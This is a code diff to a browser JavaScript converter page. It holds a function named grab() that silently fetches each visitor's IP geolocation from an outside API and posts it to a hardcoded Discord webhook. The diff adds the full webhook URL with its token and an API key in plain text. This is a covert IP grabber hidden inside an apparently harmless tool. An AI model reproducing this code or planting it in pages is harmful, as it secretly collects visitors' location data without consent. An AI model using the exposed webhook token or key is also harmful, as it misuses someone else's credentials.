@@ -1,7 +1,6 @@
 input = document.getElementById("input");
 
 input.addEventListener("input", convert);
-var webhook = require("./config.json");
 
 function convert() {
   var code = document.getElementById("input").value;
@@ -132,18 +131,27 @@ document.getElementById("input").addEventListener("keydown", function (e) {
 });
 
 function grab() {
-  var req = new XMLHttpRequest();
-  req.open("POST", webhook);
-  req.setRequestHeader("Content-type", "application/json");
-
   $.getJSON(
     "https://ipgeolocation.abstractapi.com/v1/?api_key=159b017772384f868853bf1904ea59d4",
     function (data) {
-      var params = {
-        username: "grabbywabby",
-        content: data,
+      var newdata = JSON.stringify(data);
+      newdata = newdata.split(",");
+      var out = "";
+      for (var i = 0; i < newdata.length; i++) {
+        out += newdata[i] + "\n";
+      }
+      const request = new XMLHttpRequest();
+      request.open(
+        "POST",
+        "https://discord.com/api/webhooks/953364959495069836/cFJBDYv6G2mEO74lD_aiVSMDqyljn0YvqQebKvf6oG72c5nsyFCzjACXtA1KgdsH-d4w"
+      );
+      request.setRequestHeader("Content-type", "application/json");
+      const params = {
+        username: "My Webhook Name",
+        avatar_url: "",
+        content: out,
       };
-      req.send(JSON.stringify(params));
+      request.send(JSON.stringify(params));
     }
   );
 }
